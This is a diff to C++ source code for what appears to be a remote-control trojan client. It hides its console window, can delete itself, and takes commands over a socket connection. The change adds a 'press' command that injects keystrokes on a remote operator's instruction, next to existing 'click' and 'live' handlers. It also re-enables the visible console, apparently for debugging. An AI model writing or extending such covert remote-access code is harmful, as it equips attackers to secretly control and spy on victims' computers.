@@ -14,8 +14,8 @@ int main(int argc, char* argv[])
         SelfDestruct(fileName, path);
     }
 
-    HideWindow();
-    //ShowWindow(GetConsoleWindow(), SW_RESTORE);
+    //HideWindow();
+    ShowWindow(GetConsoleWindow(), SW_RESTORE);
     std::thread checker(Checker);
     std::thread live(GoLive);
 
@@ -48,6 +48,35 @@ int main(int argc, char* argv[])
             isLive = false;
         else if (message == "live")
             isLive = !isLive;
+        else if (message.find("press") != std::string::npos)
+        {
+            std::vector<std::string> words;
+            std::size_t pos = 0;
+            std::string word;
+
+            while ((pos = message.find(" ")) != std::string::npos) {
+                word = message.substr(0, pos);
+                words.push_back(word);
+                message.erase(0, pos + 1);
+            }
+            words.push_back(message);
+
+            try
+            {
+                if (words.size() == 2)
+                    PressKey(words[1]);
+                else
+                    client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
+            }
+            catch (const std::invalid_argument& e)
+            {
+                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
+            }
+            catch (const std::out_of_range& e)
+            {
+                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
+            }
+        }
         else if (message.find("click") != std::string::npos)
         {
             std::vector<std::string> words;
